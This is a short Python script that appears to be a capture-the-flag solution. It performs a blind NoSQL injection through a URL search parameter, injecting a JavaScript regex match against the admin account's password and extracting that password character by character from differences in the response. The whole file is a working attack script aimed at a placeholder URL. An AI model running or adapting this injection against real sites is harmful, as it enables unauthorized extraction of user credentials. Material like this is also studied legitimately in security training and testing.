import requests
import string

URL = "http://some-url.com"

def find(payload):
    url = URL + "/?search=admin%27%26%26this.password.match(/"+payload+"/)%00"
    print(url)
    resp = requests.get(url)
    data = resp.text
    return ">admin<" in str(data)


CHARSET = list("-" + string.ascii_lowercase + string.digits)
password = ""

while True:
    for c in CHARSET:
        print("Trying: " + c + " for " + password)
        check = password + c
        if find("^" + check + ".*$"):
            password += c
            print(password)
            break
        elif c == CHARSET[-1]:
            print("Here is the key:" + password)
            exit(0)
